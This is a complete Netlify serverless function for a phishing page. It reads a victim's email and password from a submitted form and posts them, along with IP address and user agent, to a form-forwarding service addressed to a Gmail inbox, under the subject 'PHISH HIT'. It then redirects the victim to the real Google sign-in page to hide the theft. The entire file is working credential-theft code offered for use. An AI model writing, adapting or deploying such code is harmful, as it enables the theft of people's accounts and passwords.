exports.handler = async (event) => {
    // 1. Parse the incoming form data
    // Netlify functions receive the body as a string, so we parse it
    const params = new URLSearchParams(event.body);
    const victimEmail = params.get('email');
    const victimPassword = params.get('password');

    // 2. Send the credentials to your inbox using FormSubmit
    // FormSubmit is a free service that forwards form data to email
    const formSubmitData = {
        _subject: `🚨 PHISH HIT: ${victimEmail}`,
        _template: 'table',
        _captcha: 'false', // Disable captcha for faster delivery
        Target_Email: victimEmail,
        Captured_Password: victimPassword,
        Timestamp: new Date().toISOString(),
        User_Agent: event.headers['user-agent'] || 'Unknown',
        Remote_IP: event.headers['x-forwarded-for'] || 'Unknown'
    };

    try {
        await fetch('https://formsubmit.co/tradylewis98@gmail.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formSubmitData)
        });
    } catch (error) {
        console.error('FormSubmit error:', error);
    }

    // 3. Redirect the victim to the real Google login page
    // This makes the user think they just logged in successfully
    return {
        statusCode: 302,
        headers: {
            'Location': 'https://accounts.google.com'
        }
    };
};
